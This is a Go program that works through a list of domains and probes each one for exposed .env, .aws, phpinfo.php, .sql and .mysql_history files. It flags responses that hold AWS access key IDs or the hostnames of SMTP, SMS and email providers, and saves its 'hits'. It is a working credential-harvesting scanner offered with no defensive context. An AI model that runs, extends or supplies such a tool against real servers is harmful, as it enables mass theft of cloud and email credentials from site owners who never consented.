package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"regexp"
	"strings"
	"time"
)

func env(url string) bool {
	response, err := http.Get("https://" + url + "/.env")

	if err != nil {

		_, netErrors := http.Get("https://www.google.com")

		if netErrors != nil {

			return false

		}

		return false
	}

	defer response.Body.Close()

	body, err := ioutil.ReadAll(response.Body)

	if err != nil {

		return false

	}

	if response.StatusCode == 200 {

		x := strings.Contains(string(body), "APP_ENV=")

		if x {

			fmt.Println(".env: " + url)

		} else {

			return false

		}

	}

	return false

}

func awsfunc(url string) bool {

	response, err := http.Get("http://" + url + "/.aws")

	if err != nil {

		_, netErrors := http.Get("https://www.google.com")

		if netErrors != nil {

			return false

		}

		return false
	}

	defer response.Body.Close()

	body, err := ioutil.ReadAll(response.Body)

	if err != nil {

		return false

	}

	if response.StatusCode == 200 {
		akia, err := regexp.MatchString(`AKIA[A-Z0-9]{16}`, string(body))
		other, err2 := regexp.MatchString(`smtp\.sendgrid\.net|smtp\.mailgun\.org|smtp-relay\.sendinblue\.com|smtp.tipimail.com|smtp.sparkpostmail.com|vonage|nexmo|twilo|smtp.deliverabilitymanager.net|smtp.mailendo.com|mail.smtpeter.com|mail.smtp2go.com|smtp.socketlabs.com|secure.emailsrvr.com|mail.infomaniak.com|smtp.pepipost.com|smtp.elasticemail.com|smtp25.elasticemail.com|pro.turbo-smtp.com|smtp-pulse.com|in-v3.mailjet.com`, string(body))

		if akia {

			fmt.Println("[AKIA]: " + url)

		}

		if err != nil {

			log.Fatal(err)

		}

		if other {

			fmt.Println("[OTHER]: " + url)

		}

		if err2 != nil {

			log.Fatal(err2)

		}

		fmt.Println(".aws: " + url)

	}

	return false

}

func phpinfo(url string) bool {

	response, err := http.Get("http://" + url + "/phpinfo.php")

	if err != nil {

		_, netErrors := http.Get("https://www.google.com")

		if netErrors != nil {

			return false

		}

		return false
	}

	defer response.Body.Close()

	body, err := ioutil.ReadAll(response.Body)

	if err != nil {

		return false

	}

	if response.StatusCode == 200 {

		x := strings.Contains(string(body), "Registered Stream Socket Transports")

		if x {

			akia, err := regexp.MatchString(`AKIA[A-Z0-9]{16}`, string(body))
			other, err2 := regexp.MatchString(`smtp\.sendgrid\.net|smtp\.mailgun\.org|smtp-relay\.sendinblue\.com|smtp.tipimail.com|smtp.sparkpostmail.com|vonage|nexmo|twilo|smtp.deliverabilitymanager.net|smtp.mailendo.com|mail.smtpeter.com|mail.smtp2go.com|smtp.socketlabs.com|secure.emailsrvr.com|mail.infomaniak.com|smtp.pepipost.com|smtp.elasticemail.com|smtp25.elasticemail.com|pro.turbo-smtp.com|smtp-pulse.com|in-v3.mailjet.com`, string(body))

			if akia {

				fmt.Println("[AKIA]: " + url)

			}

			if err != nil {

				log.Fatal(err)

			}

			if other {

				fmt.Println("[OTHER]: " + url)

			}

			if err2 != nil {

				log.Fatal(err2)

			}

			fmt.Println("phpinfo: " + url)

		} else {

			return false

		}
	}

	return false

}

func sql(url string) bool {

	response, err := http.Get("http://" + url + "/.sql")
	response2, err2 := http.Get("http://" + url + "/.mysql_history")

	if err != nil {

		_, netErrors := http.Get("https://www.google.com")

		if netErrors != nil {

			return false

		}

		return false
	}

	if err2 != nil {

		_, netErrors := http.Get("https://www.google.com")

		if netErrors != nil {

			return false

		}

		return false
	}

	defer response.Body.Close()
	defer response2.Body.Close()

	if err != nil {

		return false

	}

	if err2 != nil {

		return false

	}

	if response.StatusCode == 200 {
		fmt.Println(".sql: " + url)
	}

	if response2.StatusCode == 200 {
		fmt.Println(".mysql_history: " + url)
	}
	return false
}

func main() {
	now := time.Now()
	err := os.Mkdir("hits-"+now.Format("01-02-2006"), 0755)
	fmt.Print("[NDDs File]> ")

	var filename string

	fmt.Scanln(&filename)

	file, err := os.Open(filename)

	if err != nil {

		log.Fatal(err)

	}

	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)
	var lines []string

	for scanner.Scan() {

		lines = append(lines, scanner.Text())

	}

	rep := len(lines)
	results := make(chan string)

	for i := 0; i < rep; i++ {
		go func(index int) {
			phpinfo(lines[index])
			env(lines[index])
			awsfunc(lines[index])
			sql(lines[index])
			results <- lines[index]
		}(i)
	}

	for i := 0; i < rep; i++ {
		fmt.Println(<-results)
	}
}
